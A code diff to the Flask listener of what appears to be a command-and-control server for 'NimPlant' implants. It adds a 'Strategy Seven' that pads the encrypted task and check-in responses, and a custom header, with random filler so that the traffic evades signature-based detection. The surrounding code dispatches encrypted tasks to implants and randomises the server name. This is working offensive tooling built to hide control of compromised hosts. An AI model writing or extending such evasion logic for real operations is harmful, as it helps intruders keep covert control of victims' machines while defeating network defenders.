@@ -152,6 +152,7 @@ def flaskListener(xor_key, port):
                     strategyFourEnabledEncyrpted = encryptData(str(np_server.strategyFourEnabled), np.cryptKey)
                     strategyFiveEnabledEncyrpted = encryptData(str(np_server.strategyFiveEnabled), np.cryptKey)
                     strategySixEnabledEncyrpted = encryptData(str(np_server.strategySixEnabled), np.cryptKey)
+                    strategySevenEnabledEncyrpted = encryptData(str(np_server.strategySevenEnabled), np.cryptKey)
 
                     # Update the external IP address if it changed
                     if not np.ipAddrExt == getExternalIp(flask.request):
@@ -161,16 +162,40 @@ def flaskListener(xor_key, port):
                         # There is a task - check in to update 'last seen' and return the task
                         np.checkIn()
                         task = encryptData(str(np.getNextTask()), np.cryptKey)
-                        # Return task and strategy status
-                        return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted, s3=strategyThreeEnabledEncyrpted, p3=portEncrypted, s4=strategyFourEnabledEncyrpted,
-                                            s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted), 200
+
+                        # If Strategy Seven is enabled, also send artificially generated data
+                        if np_server.strategySevenEnabled:
+                            # Return task and strategy status
+                            return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted, s3=strategyThreeEnabledEncyrpted,
+                                             p3=portEncrypted, s4=strategyFourEnabledEncyrpted,
+                                             s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted,
+                                             s7=strategySevenEnabledEncyrpted, q=contentGenerator()), 200
+
+                        else:
+                            # Return task and strategy status
+                            return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted, s3=strategyThreeEnabledEncyrpted,
+                                             p3=portEncrypted, s4=strategyFourEnabledEncyrpted,
+                                             s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted,
+                                             s7=strategySevenEnabledEncyrpted), 200
                     else:
                         # There is no task - check in to update 'last seen'
                         if np.isActive():
                             np.checkIn()
-                        # Return task and strategy status
-                        return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted, s3=strategyThreeEnabledEncyrpted, p3=portEncrypted, s4=strategyFourEnabledEncyrpted,
-                                            s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted), 200
+                        # If Strategy Seven is enabled, also send artificially generated data
+                        if np_server.strategySevenEnabled:
+                            # Return strategy status
+                            return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted,
+                                             s3=strategyThreeEnabledEncyrpted, p3=portEncrypted,
+                                             s4=strategyFourEnabledEncyrpted,
+                                            s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted,
+                                             s7=strategySevenEnabledEncyrpted, q=contentGenerator()), 200
+                        else:
+                            # Return strategy status
+                            return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted,
+                                                 s3=strategyThreeEnabledEncyrpted, p3=portEncrypted,
+                                                 s4=strategyFourEnabledEncyrpted,
+                                                 s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted,
+                                                 s7=strategySevenEnabledEncyrpted), 200
                 else:
                     notifyBadRequest(
                         getExternalIp(flask.request),
@@ -348,6 +373,7 @@ def flaskListener(xor_key, port):
                     strategyFourEnabledEncyrpted = encryptData(str(np_server.strategyFourEnabled), np.cryptKey)
                     strategyFiveEnabledEncyrpted = encryptData(str(np_server.strategyFiveEnabled), np.cryptKey)
                     strategySixEnabledEncyrpted = encryptData(str(np_server.strategySixEnabled), np.cryptKey)
+                    strategySevenEnabledEncyrpted = encryptData(str(np_server.strategySevenEnabled), np.cryptKey)
 
                     # Update the external IP address if it changed
                     if not np.ipAddrExt == getExternalIp(flask.request):
@@ -357,17 +383,38 @@ def flaskListener(xor_key, port):
                         # There is a task - check in to update 'last seen' and return the task
                         np.checkIn()
                         task = encryptData(str(np.getNextTask()), np.cryptKey)
-                        # Return task and strategy status
-                        return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted, s3=strategyThreeEnabledEncyrpted, p3=portEncrypted, s4=strategyFourEnabledEncyrpted,
-                                            s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted), 200
+                        # If Strategy Seven is enabled, also send artificially generated data
+                        if np_server.strategySevenEnabled:
+                            # Return task and strategy status
+                            return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted,
+                                                 s3=strategyThreeEnabledEncyrpted,
+                                                 p3=portEncrypted, s4=strategyFourEnabledEncyrpted,
+                                                 s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted,
+                                                 s7=strategySevenEnabledEncyrpted, q=contentGenerator()), 200
+                        else:
+                            # Return task and strategy status
+                            return flask.jsonify(t=task, s2=strategyTwoEnabledEncyrpted, s3=strategyThreeEnabledEncyrpted,
+                                             p3=portEncrypted, s4=strategyFourEnabledEncyrpted,
+                                             s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted,
+                                             s7=strategySevenEnabledEncyrpted), 200
                     else:
                         # There is no task - check in to update 'last seen'
                         if np.isActive():
                             np.checkIn()
-                        # Return task and strategy status
-                        return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted, s3=strategyThreeEnabledEncyrpted, p3=portEncrypted,
+                        # If Strategy Seven is enabled, also send artificially generated data
+                        if np_server.strategySevenEnabled:
+                            # Return strategy status
+                            return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted,
+                                            s3=strategyThreeEnabledEncyrpted, p3=portEncrypted,
+                                            s4=strategyFourEnabledEncyrpted,
+                                            s5=strategyFiveEnabledEncyrpted, s6=strategySixEnabledEncyrpted,
+                                            s7=strategySevenEnabledEncyrpted, q=contentGenerator()), 200
+                        else:
+                            # Return strategy status
+                            return flask.jsonify(status="OK", s2=strategyTwoEnabledEncyrpted,
+                                            s3=strategyThreeEnabledEncyrpted, p3=portEncrypted,
                                             s4=strategyFourEnabledEncyrpted, s5=strategyFiveEnabledEncyrpted,
-                                            s6=strategySixEnabledEncyrpted), 200
+                                            s6=strategySixEnabledEncyrpted, s7=strategySevenEnabledEncyrpted), 200
                 else:
                     notifyBadRequest(
                         getExternalIp(flask.request),
@@ -556,6 +603,20 @@ def flaskListener(xor_key, port):
             # Return randomly generated servername
             return chosenName + "/" + str(nr1) + "." + str(nr2) + "." + str(nr3)
 
+        def contentGenerator():
+            np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
+
+            # Choose one random number
+            randomNumber  = random.randint(550, 700)
+
+            # Multiply random number with a character to generate the content
+            createdContent = 'x' * randomNumber
+
+            # Encrypt
+            createdContentEncrypted = encryptData(str(createdContent), np.cryptKey)
+
+            return createdContentEncrypted
+
         @app.after_request
         def changeserver(response):
             # If strategy one activated, then generate random server name otherwise use fixed server name
@@ -575,6 +636,11 @@ def flaskListener(xor_key, port):
 
             # Server name defined
             response.headers["Server"] = np_server.ident
+
+            # Add artificial content to the header if strategy seven enabled
+            if np_server.strategySevenEnabled:
+                response.headers["q"] = contentGenerator()
+
             return response
 
     # Run the Flask web server using Gevent
